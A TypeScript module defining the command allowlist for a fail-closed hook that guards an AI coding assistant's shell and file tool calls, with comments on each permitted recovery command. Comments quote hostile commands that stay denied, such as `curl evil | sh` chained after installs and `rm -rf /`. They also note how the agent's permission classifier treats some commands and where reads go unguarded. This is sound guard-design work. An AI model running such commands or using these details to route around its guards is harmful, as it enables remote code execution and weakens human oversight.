import * as path from 'path';

import { CONFIG_FILENAME } from '@webpieces/rules-config';

// ---------------------------------------------------------------------------
// THE L0 ALLOWLIST — the vocabulary (six named cure patterns, each an ERE+JS twin pair), the ONE union
// every L0 fault consults, and isAllowed(), the single question sh and JS both ask.
//
// Split out of ./shim.ts purely for size (the shim module also renders the shim body). shim.ts
// re-exports everything here, so every existing import keeps working, and this module stays as
// dependency-free as shim.ts must be: it has to load on a tree too broken to load the rule engine.
// ---------------------------------------------------------------------------
// The OUTPUT-CAPTURE TAIL every escape hatch below tolerates — the 2026-07-21 deadlock report, part 2.
// Every allowlist was anchored to a BARE command, but the way an AI assistant actually spells a
// diagnostic command is `<cmd> 2>&1 | tail -20` (it trims the output it has to read back). The audit
// log proves it: `.webpieces/logs/ai-hook-shim.log` has `pnpm install 2>&1 | tail -15` logged as
// DENY-STALE seconds away from a bare `pnpm install` logged as ALLOW-INSTALL — the same cure, denied
// for its redirection. A cure that is denied when spelled the natural way reads to the assistant as
// "the guard blocks its own fix", which is exactly the conclusion it drew before handing the fix back
// to the human.
//
// So each hatch accepts an OPTIONAL trailing stderr redirect (`2>&1` to fold stderr in, or `2>/dev/null`
// to drop it — I hit the missing `2>/dev/null` case myself within the hour, running `pnpm install
// 2>/dev/null | tail -2` against a drift block) and an OPTIONAL pipe into `tail`/`head` carrying at
// most a line-count flag (`-20`, `-n 20`). Nothing else: the pipe target is one of two literal,
// read-only pager words and its only argument is digits, so `| sh`, `| curl …`, `| tee /etc/x` and
// every other operator stay DENIED. Spliced in place of each pattern's old `[[:space:]]*$` tail, so the
// anchoring at both ends is unchanged. Keep in sync with CAPTURE_TAIL_JS_SRC (locked by a unit test).
export const CAPTURE_TAIL_ERE =
    '([[:space:]]+2>(&1|/dev/null))?([[:space:]]*\\|[[:space:]]*(tail|head)([[:space:]]+-(n[[:space:]]+)?[0-9]+)?)?[[:space:]]*$';

// JS-regex-source twin of CAPTURE_TAIL_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
export const CAPTURE_TAIL_JS_SRC =
    '(\\s+2>(&1|\\/dev\\/null))?(\\s*\\|\\s*(tail|head)(\\s+-(n\\s+)?[0-9]+)?)?\\s*$';

// The DIRECTORY PREFIX every escape hatch tolerates — the 2026-07-30 worktree deadlock.
//
// The harness RESETS a cwd that left the workspace — a standalone `cd <worktree>` followed by `pwd` in
// the next call reports the primary clone again, and the harness prints `Shell cwd was reset to <root>`
// when it happens. So an agent working in a linked worktree can only reach that tree with a
// self-contained `cd <worktree> && …`. (A `cd` that STAYS inside the workspace persists instead, so
// "cd never persists" — which this comment used to assert — is the worktree case over-generalized.)
// The drift guard demanded a BARE `pnpm install`
// ("do NOT put a cd in front of it") while the install was needed in the worktree — the cure was
// literally untypable from the place that needed it, and a bare `cd <worktree>` was itself blocked.
//
// A leading `cd <path> &&` cannot change what the command does to a repo, so it is not a safety
// concern; and this stays as un-smuggleable as the rest of the hatch, because the path token accepts
// only path characters — no whitespace, no quote, no `$`, no backtick, and no shell operator. So
// `cd /x && pnpm install` passes while `cd $(curl evil) && pnpm install`, `cd /x; rm -rf /` and
// `cd /x && pnpm install && rm -rf /` all still FAIL CLOSED.
// Keep in sync with CD_PREFIX_JS_SRC (locked by a unit test).
export const CD_PREFIX_ERE = '(cd[[:space:]]+[A-Za-z0-9._/@~+-]+[[:space:]]*&&[[:space:]]*)?';

// JS-regex-source twin of CD_PREFIX_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
export const CD_PREFIX_JS_SRC = '(cd\\s+[A-Za-z0-9._\\/@~+-]+\\s*&&\\s*)?';

// Every hatch below starts with the anchor + the optional `cd` prefix. Spliced in place of each
// pattern's old bare `^`, so the anchoring at both ends is unchanged.
const CD_PREFIX_ERE_ANCHORED = '^' + CD_PREFIX_ERE;
const CD_PREFIX_JS_ANCHORED = '^' + CD_PREFIX_JS_SRC;

// Package-manager install commands allowed to pass the fail-closed shim so the assistant can
// self-heal the guards (run `pnpm install`) when node_modules is absent — otherwise the guard blocks
// the very command that re-enables it (deadlock). nx/pnpm monorepo only. POSIX ERE (fed to `grep -E`).
//
// What's allowed (the realistic self-heal spellings — an earlier version only matched a bare
// `pnpm install`, so `pnpm i` and `--flag=value` got fail-CLOSED and re-deadlocked the assistant):
//   - pkg managers: pnpm | npm   (this nx monorepo uses pnpm; npm is accepted as the fallback. NOT
//                                 yarn — this repo installs with pnpm/npm only, so yarn stays denied.)
//   - subcommands:  install | i  (`pnpm i` / `npm i` is just shorthand for `install`)
//   - flags:        zero or more `--flag` / `--flag=value` tokens (no whitespace, no operators)
//
// An optional LEADING `cd <path> &&` (CD_PREFIX_ERE) — added 2026-07-30. The old comment here argued a
// `cd` is never needed because Claude Code starts at the repo root. That is false in a LINKED WORKTREE:
// git copies no node_modules into a new worktree, so the very first call there needs an install in THAT
// tree, and the harness resets a cwd that left the workspace, so `cd <worktree> && pnpm install` is the only
// spelling that reaches it. Denying the prefix made the cure unreachable from the one place it was
// needed. It widens nothing: the prefix cannot change what the install does, and the path token admits
// no operator (see CD_PREFIX_ERE).
//
// Why it's un-smuggleable (the whole point of failing closed): the tail is anchored to `$` and only
// accepts `--word` tokens, so no shell operator (`;`, `&&`, `|`, backticks, `$()`, `>`, `<`) can ride
// along — `pnpm install && rm -rf /` and `pnpm install; curl evil | sh` still FAIL CLOSED.
// Keep in sync with INSTALLER_ALLOW_JS below (locked by a unit test).
const INSTALLER_BODY_ERE = '(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*';
export const INSTALLER_ALLOW_ERE =
    CD_PREFIX_ERE_ANCHORED + INSTALLER_BODY_ERE + CAPTURE_TAIL_ERE;

// JS-regex twin of INSTALLER_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). The fail-closed shim (pure sh)
// uses the ERE for the missing-bin case; the runner uses THIS twin (runBashInternal) so installer
// commands also pass when the bin IS installed but the config is invalid/ahead of the validator —
// same deadlock, other side. A unit test asserts the two agree on a sample set.
const INSTALLER_BODY_JS = '(pnpm|npm)\\s+(install|i)(\\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*';
export const INSTALLER_ALLOW_JS =
    new RegExp(CD_PREFIX_JS_ANCHORED + INSTALLER_BODY_JS + CAPTURE_TAIL_JS_SRC);

// The RECOVERY command, allowed alongside INSTALLER_ALLOW_ERE on every fail-closed path.
//
// Why a plain `pnpm install` is NOT enough (learned the hard way): when node_modules is CORRUPT — a
// package half-written by an install that was killed mid-copy — pnpm sees a package dir carrying the
// right version in its package.json, considers it installed, and SKIPS it. `pnpm install` cheerfully
// reports "up to date" and the corruption survives every retry. The only reliable cure is to delete
// node_modules so pnpm re-materializes the package from the (healthy) global store. So the fail-closed
// escape hatch MUST allow the wipe too, or the assistant is left denying its own cure (deadlock).
//
// Kept as tight as INSTALLER_ALLOW_ERE: anchored at both ends, the ONLY shell operator accepted is a
// single `&&` in exactly one position, and the rm target is literally `node_modules` — nothing else.
// So `rm -rf /`, `rm -rf node_modules/../..`, `rm -rf node_modules; curl evil | sh` all stay DENIED.
// Keep in sync with RECOVERY_ALLOW_JS below (locked by a unit test).
const RECOVERY_BODY_ERE =
    'rm[[:space:]]+-rf[[:space:]]+(\\./)?node_modules/?([[:space:]]*&&[[:space:]]*(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?';
export const RECOVERY_ALLOW_ERE =
    CD_PREFIX_ERE_ANCHORED + RECOVERY_BODY_ERE + CAPTURE_TAIL_ERE;

// JS-regex twin of RECOVERY_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
const RECOVERY_BODY_JS =
    'rm\\s+-rf\\s+(\\.\\/)?node_modules\\/?(\\s*&&\\s*(pnpm|npm)\\s+(install|i)(\\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?';
export const RECOVERY_ALLOW_JS =
    new RegExp(CD_PREFIX_JS_ANCHORED + RECOVERY_BODY_JS + CAPTURE_TAIL_JS_SRC);

// The exact command we tell the human/assistant to run to recover a corrupt node_modules.
export const RECOVERY_CMD = 'rm -rf node_modules && pnpm install';

// Git SYNC commands. Part of the ONE L0 allowlist (see L0_ALLOW_ERE), so they are allowed under EVERY
// L0 fault, not just drift. They used to be gated on drift alone, on the reasoning that no amount of
// git can fix a missing/broken bin. True but irrelevant: an allowlist entry that cannot help also
// cannot hurt, and the gating had a real cost — under a stale committed shim, `git pull` is the ONLY
// cure when the CHECKOUT is the stale side, and it was denied. Ungating it removes that trap.
//
// `merge` was REMOVED from this list. It was accepted here while the guards are DOWN, and the drift
// message had to spend a sentence telling the reader NOT to use the thing the allowlist permits —
// because redirect-how-to-merge-main blocks `git merge` in every form the moment the guards come back.
// Main is merged only through the 3-point fork merge (`wp-start-*`). With one global allowlist that
// hole would widen from one fault to all six, so the entry goes rather than the gating.
//
// The deadlock this entry exists for, hit 2026-07-17:
//
// The drift guard was written for ONE direction — you `git pull`, the new package.json pins a NEWER
// @webpieces, node_modules is still OLD, and `pnpm install` catches it up. But the comparison is a
// plain `!=`, so it fires just as hard in the INVERSE case: check out a branch (or a local `main`)
// that is BEHIND origin, and now the PIN is the stale side while node_modules is correct and NEWER.
//
// In that inverse case `pnpm install` is not the cure, it is the disease: it happily DOWNGRADES
// node_modules to the stale pin. The real cure is `git pull` — which the guard denied, because the
// allowlist only ever contained the installer. So the assistant was told to run the one command that
// made things worse, while the fix was blocked. Allow the sync commands here and the deadlock is gone.
//
// Kept exactly as tight as INSTALLER_ALLOW_ERE: anchored at both ends, and every argument token is a
// bare word or `--flag` — so no shell operator (`;`, `&&`, `|`, backticks, `$()`, `>`) can ride along.
// `git pull; curl evil | sh` still FAILS CLOSED. Deliberately NOT `git checkout`: switching branches is
// what CAUSES this drift, and a fail-closed escape hatch should only contain cures.
// Keep in sync with SYNC_ALLOW_JS below (locked by a unit test).
const SYNC_BODY_ERE = 'git[[:space:]]+(pull|fetch)([[:space:]]+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*';
export const SYNC_ALLOW_ERE =
    CD_PREFIX_ERE_ANCHORED + SYNC_BODY_ERE + CAPTURE_TAIL_ERE;

// JS-regex twin of SYNC_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
const SYNC_BODY_JS = 'git\\s+(pull|fetch)(\\s+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*';
export const SYNC_ALLOW_JS =
    new RegExp(CD_PREFIX_JS_ANCHORED + SYNC_BODY_JS + CAPTURE_TAIL_JS_SRC);

// The CURE for the committed-shim self-guard (now enforced by the binary — see committedShimStale
// below): regenerate .claude/webpieces/ai-hook.sh from renderShim(). Allowed while that guard is up —
// like the installer, it is a webpieces-owned, no-network local action whose whole job is to re-arm the
// guard, so denying it would deadlock the assistant against its own fix. Accepts the realistic spellings of the wp-upgrade-shim bin under
// pnpm/npm/npx; anchored at both ends with only a bare bin name, so no shell operator can ride along.
// Keep in sync with UPGRADE_SHIM_ALLOW_JS below (locked by a unit test).
const UPGRADE_SHIM_BODY_ERE = '(pnpm|npm|npx)([[:space:]]+(exec|run))?[[:space:]]+wp-upgrade-shim';
export const UPGRADE_SHIM_ALLOW_ERE =
    CD_PREFIX_ERE_ANCHORED + UPGRADE_SHIM_BODY_ERE + CAPTURE_TAIL_ERE;

// JS-regex twin of UPGRADE_SHIM_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
const UPGRADE_SHIM_BODY_JS = '(pnpm|npm|npx)(\\s+(exec|run))?\\s+wp-upgrade-shim';
export const UPGRADE_SHIM_ALLOW_JS =
    new RegExp(CD_PREFIX_JS_ANCHORED + UPGRADE_SHIM_BODY_JS + CAPTURE_TAIL_JS_SRC);

// The exact command we tell the assistant to run to regenerate a reverted/edited committed shim.
export const UPGRADE_SHIM_CMD = 'pnpm exec wp-upgrade-shim';

// The PRIMARY, version-AGNOSTIC cure for the self-guard — and the reason this exists (hit 2026-07-21):
// the self-guard's deny used to name ONLY `pnpm exec wp-upgrade-shim`, but that bin ships in
// @webpieces/ai-hook-rules >= 0.4.408. Every repo on an OLDER installed release — i.e. exactly the
// repos that can hit this, since node_modules is what the shim compares itself against — got
// "command not found" and was left with a hard block and no working cure. In the reporter's words, the
// message gave "ZERO information" on how to actually fix it.
//
// A plain `cp` of the installed template over the committed shim has none of that version coupling:
// templates/ai-hook.sh ships in EVERY release and is byte-identical to renderShim() (locked by a unit
// test), which is exactly what the binary's committedShimStale() compares the committed shim against;
// cp onto an existing file keeps the destination's mode, so the shim stays executable with no chmod.
// It cures the block on any version, old or new —
// which is why the deny now leads with it and only mentions the bin as the newer equivalent.
//
// Kept as tight as the other escape hatches: anchored at both ends, no flags, and BOTH paths are
// literal webpieces-owned paths — so no other file can be read or written and no operator can ride
// along. Keep in sync with RESTORE_SHIM_ALLOW_JS below (locked by a unit test).
const RESTORE_SHIM_BODY_ERE =
    'cp[[:space:]]+(\\./)?node_modules/@webpieces/ai-hook-rules/templates/ai-hook\\.sh[[:space:]]+(\\./)?\\.claude/webpieces/ai-hook\\.sh';
export const RESTORE_SHIM_ALLOW_ERE =
    CD_PREFIX_ERE_ANCHORED + RESTORE_SHIM_BODY_ERE + CAPTURE_TAIL_ERE;

// JS-regex twin of RESTORE_SHIM_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
const RESTORE_SHIM_BODY_JS =
    'cp\\s+(\\.\\/)?node_modules\\/@webpieces\\/ai-hook-rules\\/templates\\/ai-hook\\.sh\\s+(\\.\\/)?\\.claude\\/webpieces\\/ai-hook\\.sh';
export const RESTORE_SHIM_ALLOW_JS =
    new RegExp(CD_PREFIX_JS_ANCHORED + RESTORE_SHIM_BODY_JS + CAPTURE_TAIL_JS_SRC);

// The exact command the self-guard's deny tells the assistant to run. Works on EVERY installed version.
export const RESTORE_SHIM_CMD =
    'cp node_modules/@webpieces/ai-hook-rules/templates/ai-hook.sh .claude/webpieces/ai-hook.sh';

// The THIRD cure for the self-guard, and the one with the longest shelf life: the installer itself.
//
// `wp-install-ai-hooks` has shipped in every release of this package since it created the shim (the
// shim's own header line names it as the managing command), and install-entry.ts calls healShim()
// FIRST, through the dependency-free ./shim module, before it lazily requires the rule engine. So it
// re-arms the committed shim on a tree too broken to load setup.ts, exactly like wp-upgrade-shim, and
// it does so on releases that predate wp-upgrade-shim (< 0.4.408) where that bin is not on disk at all.
// That combination — always present AND a named bin rather than a raw file overwrite — is why the deny
// now leads with it: the `cp` is version-agnostic too, but Claude Code's own permission classifier
// treats a bare cp over a repo file as something to confirm, while a named bin reads as a tool call.
//
// FLAGS ARE ACCEPTED. The installer's non-interactive spelling is `--target=project`, and a pattern that
// accepted no flags at all made it untypable — the same deadlock shape as the missing `2>&1 | tail` and
// the missing `cd` prefix: a deny naming a command the allowlist rejects. The flag token is the identical
// one INSTALLER_BODY_ERE already allows — `--word` / `--word=value`, no whitespace, no operator — so it
// widens nothing else: `pnpm wp-install-ai-hooks --target=project && rm -rf /` still FAILS CLOSED.
//
// Kept as tight as the other escape hatches: anchored at both ends, bare bin name plus `--flag` tokens
// only, so no shell operator can ride along. Keep in sync with INSTALL_HOOKS_ALLOW_JS (locked by a unit test).
const INSTALL_HOOKS_BODY_ERE =
    '(pnpm|npm|npx)([[:space:]]+(exec|run))?[[:space:]]+wp-install-ai-hooks([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*';
export const INSTALL_HOOKS_ALLOW_ERE =
    CD_PREFIX_ERE_ANCHORED + INSTALL_HOOKS_BODY_ERE + CAPTURE_TAIL_ERE;

// JS-regex twin of INSTALL_HOOKS_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
const INSTALL_HOOKS_BODY_JS =
    '(pnpm|npm|npx)(\\s+(exec|run))?\\s+wp-install-ai-hooks(\\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*';
export const INSTALL_HOOKS_ALLOW_JS =
    new RegExp(CD_PREFIX_JS_ANCHORED + INSTALL_HOOKS_BODY_JS + CAPTURE_TAIL_JS_SRC);

// The exact command the self-guard's deny names FIRST. Present in every release that has a shim.
export const INSTALL_HOOKS_CMD = 'pnpm exec wp-install-ai-hooks';

// The non-interactive spelling of the FULL install (config + CI gate + hook wiring): the `--target`
// flag is what replaces the interactive prompt. `--flag=value` is accepted by the same token
// INSTALLER_BODY_ERE uses, so this spelling is pinned as a sample rather than given its own pattern.
export const INSTALL_HOOKS_TARGET_CMD = 'pnpm wp-install-ai-hooks --target=project';

// ---------------------------------------------------------------------------
// THE L0 ALLOWLIST — one list, consulted identically by every tooling-integrity fault.
//
// L0 is the outermost layer: it blocks work while node_modules, the committed shim, or
// webpieces.config.json are in a state that makes every OTHER guard untrustworthy. Its six faults are
//   D  version drift        (sh, before the bin runs)   S  committed shim != renderShim()  (bin)
//   X  bin missing          (sh)                        C  webpieces.config.json missing   (bin)
//   K  bin present, crashed (sh)                        Y  a loaded rule has no config key (bin)
//
// Drawn as a decision matrix, L0 has NO genuine second dimension. Every branch reduces to
//   fault present AND call not on the allowlist  ->  BLOCK(messageFor(fault))
// and the only thing that varies per fault is the MESSAGE. The applicability of each cure used to vary
// too, but that variation was an accident of which code path a fault happened to be detected in, and it
// cost four real defects:
//   - under S, `pnpm install` was denied — so when node_modules is the STALE side, every permitted cure
//     wrote the OLD binary's renderShim() over a NEWER committed shim, silently reverting a commit.
//   - under S, `git pull` was denied — the only cure when the CHECKOUT is the stale side.
//   - under D/X/K, every Read was denied — no way to inspect, not even the config that disables it.
//   - under C/Y, `rm -rf node_modules && pnpm install` was denied while a bare `pnpm install` passed.
// All four disappear by consulting ONE list. See webpieces.guard-matrix.md for the rendered table.
//
// Composed from the BODY of each cure above so there is exactly one copy of every pattern: the six
// named exports stay the vocabulary (and keep their own tests), this union is the decision.
//
// L0_ALLOWLIST is that list as DATA — the one array isAllowed(), the rendered shim's grep and the
// published matrix doc (webpieces.guard-matrix.md) all derive from, so the doc cannot describe an
// allowlist the code does not have. Adding an entry here is the ONLY way to widen L0.
// ---------------------------------------------------------------------------

/** One tool call as L0 judges it: the tool name, the Bash command (or ''), the file target (or ''). */
export class L0Call {
    constructor(
        readonly toolName: string,
        readonly command: string,
        readonly filePath: string,
    ) {}
}

/**
 * One entry of THE L0 allowlist. Data-only → a class, per CLAUDE.md.
 *
 * `ere`/`js` are the twin regex BODIES for a Bash entry, or null for a tool-shaped entry (Read, the
 * webpieces.config.json target) that no regex can express. `sample` is a call this entry must accept —
 * it is what the matrix-coverage and cure-reachability tests drive isAllowed() with.
 *
 * `extraSamples` pins ADDITIONAL spellings the same entry must accept. A spelling that some deny
 * message prescribes belongs here, or nothing stops a later tightening of the pattern from making that
 * message's cure untypable again — which is the deadlock shape this whole module exists to prevent.
 */
export class L0AllowEntry {
    // eslint-disable-next-line @typescript-eslint/max-params
    constructor(
        readonly label: string,
        readonly kind: 'pass' | 'allow',
        readonly ere: string | null,
        readonly js: string | null,
        readonly sample: L0Call,
        readonly extraSamples: readonly L0Call[] = [],
    ) {}

    /** Every call this entry pins: the canonical sample plus every extra spelling. */
    allSamples(): readonly L0Call[] {
        return [this.sample, ...this.extraSamples];
    }
}

export const L0_ALLOWLIST: readonly L0AllowEntry[] = [
    new L0AllowEntry('any Read', 'pass', null, null, new L0Call('Read', '', 'README.md')),
    new L0AllowEntry(`a Write/Edit whose target is ${CONFIG_FILENAME}`, 'pass', null, null,
        new L0Call('Edit', '', `/repo/${CONFIG_FILENAME}`)),
    new L0AllowEntry('pnpm|npm install', 'allow', INSTALLER_BODY_ERE, INSTALLER_BODY_JS,
        new L0Call('Bash', 'pnpm install', '')),
    new L0AllowEntry(`${RECOVERY_CMD} - the cure for a CORRUPT node_modules`, 'allow', RECOVERY_BODY_ERE, RECOVERY_BODY_JS,
        new L0Call('Bash', RECOVERY_CMD, '')),
    // webpieces-disable no-fetch -- prose naming the git sync commands in a doc label, not an HTTP call
    new L0AllowEntry('git pull / git fetch - merge is NOT on the list', 'allow', SYNC_BODY_ERE, SYNC_BODY_JS,
        new L0Call('Bash', 'git pull', '')),
    new L0AllowEntry(UPGRADE_SHIM_CMD, 'allow', UPGRADE_SHIM_BODY_ERE, UPGRADE_SHIM_BODY_JS,
        new L0Call('Bash', UPGRADE_SHIM_CMD, '')),
    new L0AllowEntry(RESTORE_SHIM_CMD, 'allow', RESTORE_SHIM_BODY_ERE, RESTORE_SHIM_BODY_JS,
        new L0Call('Bash', RESTORE_SHIM_CMD, '')),
    new L0AllowEntry(`${INSTALL_HOOKS_CMD} (flags allowed, e.g. --target=project)`, 'allow', INSTALL_HOOKS_BODY_ERE, INSTALL_HOOKS_BODY_JS,
        new L0Call('Bash', INSTALL_HOOKS_CMD, ''),
        [new L0Call('Bash', INSTALL_HOOKS_TARGET_CMD, '')]),
];

const L0_BODIES_ERE = L0_ALLOWLIST.flatMap((e: L0AllowEntry): string[] => (e.ere === null ? [] : [e.ere]));
const L0_BODIES_JS = L0_ALLOWLIST.flatMap((e: L0AllowEntry): string[] => (e.js === null ? [] : [e.js]));

// The ONE Bash allowlist. Anchored and tailed exactly like each individual hatch, so it inherits every
// security property: no shell operator can ride along, and only the optional leading `cd <path> &&` /
// trailing `2>&1 | tail -N` are tolerated.
export const L0_ALLOW_ERE =
    CD_PREFIX_ERE_ANCHORED + '(' + L0_BODIES_ERE.join('|') + ')' + CAPTURE_TAIL_ERE;

// JS twin of L0_ALLOW_ERE. A unit test asserts the two agree on a shared sample set.
export const L0_ALLOW_JS =
    new RegExp(CD_PREFIX_JS_ANCHORED + '(' + L0_BODIES_JS.join('|') + ')' + CAPTURE_TAIL_JS_SRC);

// The non-Bash half of the same list, kept here so sh and JS answer the identical question.
//
// `Read` is on the list because you must be able to READ to know how to fix — the original
// block-everything-but-the-cures version deadlocked a repo that also needed its config fixed. Note the
// asymmetry this creates and why it is accepted: under S/C/Y the bin IS running, so an allowed Read
// falls THROUGH to read-stale-guard and stale-main protection still holds; under D/X/K the bin is never
// executed, so there is nothing to fall through to and the Read is genuinely unguarded. Narrowing this
// entry to a path pattern is the fix for that, and is deliberately left for a follow-up.
export const READ_TOOLS: ReadonlySet<string> = new Set(['Read']);

/**
 * `isAllowed(call)` — THE L0 allowlist, with no fault parameter. See the block comment above.
 *
 * Returns the OUTCOME KIND, because the two are not the same thing:
 *   - 'pass'  → L0 has no objection; fall THROUGH so L1/L2 still judge this call (Read, config edit).
 *   - 'allow' → terminal; bypass everything, because a cure must stay reachable even when a downstream
 *               guard would block it.
 *   - null    → not on the list.
 */
// webpieces-disable no-function-outside-class -- pure predicate over the exported allowlist data, in the dependency-free shim module (it must load on a corrupt tree, so it cannot depend on DI)
export function isAllowed(toolName: string, command: string, filePath: string): 'pass' | 'allow' | null {
    if (READ_TOOLS.has(toolName)) return 'pass';
    if (path.basename(filePath) === CONFIG_FILENAME) return 'pass';
    if (L0_ALLOW_JS.test(command.trim())) return 'allow';
    return null;
}
